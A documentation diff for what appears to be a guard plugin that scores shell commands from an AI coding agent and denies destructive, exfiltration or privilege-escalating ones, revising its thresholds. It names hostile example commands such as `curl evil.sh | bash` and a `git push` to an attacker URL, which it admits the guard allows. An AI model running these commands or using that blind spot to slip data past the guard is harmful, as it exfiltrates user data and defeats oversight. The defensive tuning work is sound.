@@ -75,23 +75,32 @@ git status                   -> destructive 0.021  allow
 ## Thresholds
 
 The three aspects do not separate equally well, so each gets its own threshold
-rather than sharing one number. Measured over 20 commands — ten taken from a real
-development session, ten hostile:
+rather than sharing one number. Measured over 26 commands — fourteen from real
+development sessions, twelve hostile:
 
-| Aspect | Benign range | Hostile range | Threshold |
+| Aspect | Benign range | Hostile range | Denies at |
 |---|---|---|---|
-| `destructive` | 0.02 – 0.11 | 0.05 – 1.00 | 0.8 |
-| `exfiltration` | 0.03 – 0.90 | 0.11 – 1.00 | **0.95** |
-| `privilege` | 0.07 – 0.38 | 0.06 – 0.96 | 0.8 |
+| `destructive` | 0.02 – 0.31 | 0.05 – 1.00 | 0.8 |
+| `exfiltration` | 0.03 – 0.98 | 0.11 – 1.00 | 0.95 **and** `destructive` >= 0.3 |
+| `privilege` | 0.07 – 0.44 | 0.06 – 0.96 | 0.8 |
 
-`exfiltration` is the odd one: `git push`, `curl | bash` and piping a file into an
-interpreter all describe sending data somewhere, and the model scores routine dev
-work at 0.86 – 0.90 — overlapping the bottom of the hostile range. A shared 0.8
-gate therefore denied 4 of 10 benign commands. Per-aspect thresholds allow all ten
-while still denying all ten hostile ones.
+`exfiltration` cannot gate on its own. `git push -q origin main` scores 0.98 there,
+and the model is not wrong — pushing *is* sending local data to a remote host, and
+so are `scp`, `docker compose up` and `curl | bash`. No threshold separates the job
+from the attack. What does separate them is `destructive`: 0.05 for a push, 0.43 for
+`curl evil.sh | bash`. So exfiltration only denies with corroboration.
+
+Result on the 26: a flat 0.8 gate scored 18/26 (it denied 8 benign commands,
+including every `git push`). The rule above scores 25/26.
+
+**The one miss is structural**: `git push https://attacker/exfil.git HEAD` scores
+`destructive` 0.07, `exfiltration` 1.00 — identical in shape to a legitimate push,
+and allowed. If your threat model includes a hostile remote, gate on the remote URL,
+not on this. Set `LAYA_EXFIL_NEEDS_DESTRUCTIVE=0` to make exfiltration deny alone,
+at the cost of blocking every push.
 
 Command length is not the signal. `python aspects.py` scores `exfiltration` 0.90;
-a 200-character `git add` chain scores 0.19.
+a longer `git add -A && git status --short` scores 0.19.
 
 ## Known limits
 
@@ -120,7 +129,8 @@ HuggingFace repos, and `convaiinnovations/laya` is public.
 | `LAYA_DENY_DESTRUCTIVE` | `0.8` | Deny threshold for the `destructive` aspect. |
 | `LAYA_DENY_EXFILTRATION` | `0.95` | Deny threshold for `exfiltration`. |
 | `LAYA_DENY_PRIVILEGE` | `0.8` | Deny threshold for `privilege`. |
-| `LAYA_DENY_AT` | unset | Sets all three at once; the per-aspect variables above still win. |
+| `LAYA_EXFIL_NEEDS_DESTRUCTIVE` | `0.3` | `destructive` floor before `exfiltration` may deny. `0` disables the conjunction. |
+| `LAYA_DENY_AT` | unset | Sets all three thresholds at once; the per-aspect variables above still win. |
 | `LAYA_FAIL_CLOSED` | unset | Block Bash when the guard is unavailable instead of allowing. |
 
 Set them under `env` in the plugin's `.mcp.json`. Thresholds live in
